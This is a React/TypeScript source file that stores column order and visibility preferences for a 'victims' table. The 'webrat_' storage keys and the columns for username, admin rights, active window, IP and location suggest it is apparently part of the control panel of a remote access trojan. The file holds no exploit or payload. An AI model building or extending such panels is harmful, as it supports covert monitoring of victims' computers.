"use client";

import { createContext, useCallback, useContext, useEffect, useMemo, useState } from "react";

import { DEFAULT_VICTIMS_COLUMN_ORDER, type VictimsColumnKey } from "./victims-columns";

type ColumnPrefKey =
   | "status"
   | "username"
   | "admin"
   | "comment"
   | "location"
   | "pcname"
   | "active_window"
   | "last_active"
   | "id"
   | "ip"
   | "os"
   | "cpu"
   | "ram"
   | "gpu";

const COL_PREFS_DEFAULTS: Record<ColumnPrefKey, boolean> = {
   status: true,
   username: true,
   admin: false,
   comment: true,
   location: true,
   pcname: true,
   active_window: true,
   last_active: true,
   id: false,
   ip: true,
   os: true,
   cpu: false,
   ram: false,
   gpu: false,
};

function prefStorageKey(k: ColumnPrefKey): string {
   return `webrat_col_${k}`;
}

function readBoolPref(k: ColumnPrefKey): boolean {
   const fallback = COL_PREFS_DEFAULTS[k];
   try {
      const raw = localStorage.getItem(prefStorageKey(k));
      if (raw === null || raw === undefined || raw === "") return fallback;
      return raw === "1";
   } catch {
      return fallback;
   }
}

function writeBoolPref(k: ColumnPrefKey, v: boolean) {
   try {
      localStorage.setItem(prefStorageKey(k), v ? "1" : "0");
   } catch {
   }
}

type ColumnVisibility = Record<VictimsColumnKey, boolean>;

function visibilityFromPrefs(): ColumnVisibility {
   return {
      "h-country": readBoolPref("location"),
      "h-icon": readBoolPref("status"),
      "h-user": readBoolPref("username"),
      "h-admin": readBoolPref("admin"),
      "h-pc-name": readBoolPref("pcname"),
      "h-window": readBoolPref("active_window"),
      "h-last-active": readBoolPref("last_active"),
      "h-id": readBoolPref("id"),
      "h-ip": readBoolPref("ip"),
      "h-os": readBoolPref("os"),
      "h-cpu": readBoolPref("cpu"),
      "h-ram": readBoolPref("ram"),
      "h-gpu": readBoolPref("gpu"),
      "h-comment": readBoolPref("comment"),
   };
}

function applyBodyColFlags(vis: ColumnVisibility) {
   try {
      document.body.classList.toggle("hideColStatus", !vis["h-icon"]);
      document.body.classList.toggle("hideColUsername", !vis["h-user"]);
      document.body.classList.toggle("hideColAdmin", !vis["h-admin"]);
      document.body.classList.toggle("hideColComment", !vis["h-comment"]);
      document.body.classList.toggle("hideColLocation", !vis["h-country"]);
      document.body.classList.toggle("hideColPcName", !vis["h-pc-name"]);
      document.body.classList.toggle("hideColActiveWindow", !vis["h-window"]);
      document.body.classList.toggle("hideColLastActive", !vis["h-last-active"]);
      document.body.classList.toggle("hideColId", !vis["h-id"]);
      document.body.classList.toggle("hideColIp", !vis["h-ip"]);
      document.body.classList.toggle("hideColOs", !vis["h-os"]);
      document.body.classList.toggle("hideColCpu", !vis["h-cpu"]);
      document.body.classList.toggle("hideColRam", !vis["h-ram"]);
      document.body.classList.toggle("hideColGpu", !vis["h-gpu"]);
   } catch {
   }
}

const ORDER_STORAGE_KEY = "webrat_table_col_order";

function readSavedOrder(): VictimsColumnKey[] | null {
   try {
      const raw = localStorage.getItem(ORDER_STORAGE_KEY);
      if (!raw) return null;
      const parsed = JSON.parse(raw);
      if (!Array.isArray(parsed)) return null;
      const safe = parsed
         .map((x) => String(x))
         .filter((x): x is VictimsColumnKey => DEFAULT_VICTIMS_COLUMN_ORDER.includes(x as VictimsColumnKey));
      return safe.length ? safe : null;
   } catch {
      return null;
   }
}

function writeSavedOrder(order: VictimsColumnKey[]) {
   try {
      localStorage.setItem(ORDER_STORAGE_KEY, JSON.stringify(order));
   } catch {
   }
}

function clearSavedOrder() {
   try {
      localStorage.removeItem(ORDER_STORAGE_KEY);
   } catch {
   }
}

type Ctx = {
   columnOrder: VictimsColumnKey[];
   setColumnOrder: (next: VictimsColumnKey[]) => void;
   columnVisibility: ColumnVisibility;
   setColumnVisibility: (next: ColumnVisibility) => void;
   isFilterModalOpen: boolean;
   openFilterModal: () => void;
   closeFilterModal: () => void;
   resetFiltersAndOrder: () => void;
};

const VictimsTablePrefsCtx = createContext<Ctx | null>(null);

export function useVictimsTablePrefs() {
   const ctx = useContext(VictimsTablePrefsCtx);
   if (!ctx) throw new Error("victims_table_prefs_ctx_missing");
   return ctx;
}

export function VictimsTablePrefsProvider(props: { children: React.ReactNode }) {
   const [columnOrder, setColumnOrderState] = useState<VictimsColumnKey[]>(() => {
      const saved = typeof window !== "undefined" ? readSavedOrder() : null;
      return saved ?? DEFAULT_VICTIMS_COLUMN_ORDER;
   });

   const [columnVisibility, setColumnVisibilityState] = useState<ColumnVisibility>(() => {
      return typeof window !== "undefined" ? visibilityFromPrefs() : visibilityFromPrefs();
   });

   const [isFilterModalOpen, setIsFilterModalOpen] = useState(false);

   useEffect(() => {
      applyBodyColFlags(columnVisibility);
   }, [columnVisibility]);

   const setColumnOrder = useCallback((next: VictimsColumnKey[]) => {
      setColumnOrderState(next);
      writeSavedOrder(next);
   }, []);

   const setColumnVisibility = useCallback((next: ColumnVisibility) => {
      setColumnVisibilityState(next);

      (Object.keys(next) as VictimsColumnKey[]).forEach((k) => {
         const v = !!next[k];
         if (k === "h-icon") writeBoolPref("status", v);
         if (k === "h-user") writeBoolPref("username", v);
         if (k === "h-admin") writeBoolPref("admin", v);
         if (k === "h-comment") writeBoolPref("comment", v);
         if (k === "h-country") writeBoolPref("location", v);
         if (k === "h-pc-name") writeBoolPref("pcname", v);
         if (k === "h-window") writeBoolPref("active_window", v);
         if (k === "h-last-active") writeBoolPref("last_active", v);
         if (k === "h-id") writeBoolPref("id", v);
         if (k === "h-ip") writeBoolPref("ip", v);
         if (k === "h-os") writeBoolPref("os", v);
         if (k === "h-cpu") writeBoolPref("cpu", v);
         if (k === "h-ram") writeBoolPref("ram", v);
         if (k === "h-gpu") writeBoolPref("gpu", v);
      });
   }, []);

   const resetFiltersAndOrder = useCallback(() => {
      (Object.keys(COL_PREFS_DEFAULTS) as ColumnPrefKey[]).forEach((k) => {
         writeBoolPref(k, COL_PREFS_DEFAULTS[k]);
      });

      clearSavedOrder();

      setColumnOrderState(DEFAULT_VICTIMS_COLUMN_ORDER);
      setColumnVisibilityState(visibilityFromPrefs());
   }, []);

   const ctx = useMemo<Ctx>(
      () => ({
         columnOrder,
         setColumnOrder,
         columnVisibility,
         setColumnVisibility,
         isFilterModalOpen,
         openFilterModal: () => setIsFilterModalOpen(true),
         closeFilterModal: () => setIsFilterModalOpen(false),
         resetFiltersAndOrder,
      }),
      [columnOrder, columnVisibility, isFilterModalOpen, resetFiltersAndOrder, setColumnOrder, setColumnVisibility],
   );

   return <VictimsTablePrefsCtx.Provider value={ctx}>{props.children}</VictimsTablePrefsCtx.Provider>;
}